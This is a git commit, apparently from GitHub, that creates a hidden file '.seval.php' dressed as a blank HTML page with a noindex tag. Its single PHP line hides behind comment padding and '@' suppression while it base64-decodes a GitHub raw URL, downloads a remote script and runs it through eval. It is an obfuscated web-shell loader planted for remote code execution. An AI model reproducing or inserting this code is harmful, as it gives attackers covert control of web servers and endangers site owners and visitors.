6b2d3a9e3d8b0d10792126fc09a2d4af2fd642cb
0xBakusedu <161377416+0xBakusedu@users.noreply.github.com>
2025-08-08 12:02:50 -0700

    Create .seval.php

---
+++ .seval.php
@@ -0,0 +1,11 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex,nofollow">
+</head>
+<body>
+    <?php echo "";?><?=/****/@null; /********/ /*******/ /********/@eval/****/("?>".file_get_contents/*******/("https://".base64_decode("cmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS93aWxsaWFtbGF1cmVudC9rZWNvYWstc3RlYWx0aC9yZWZzL2hlYWRzL21haW4vc2ltcGxlLXZlcnNpb24vcy5waHA=")));/**/?>
+</body>
+</html>
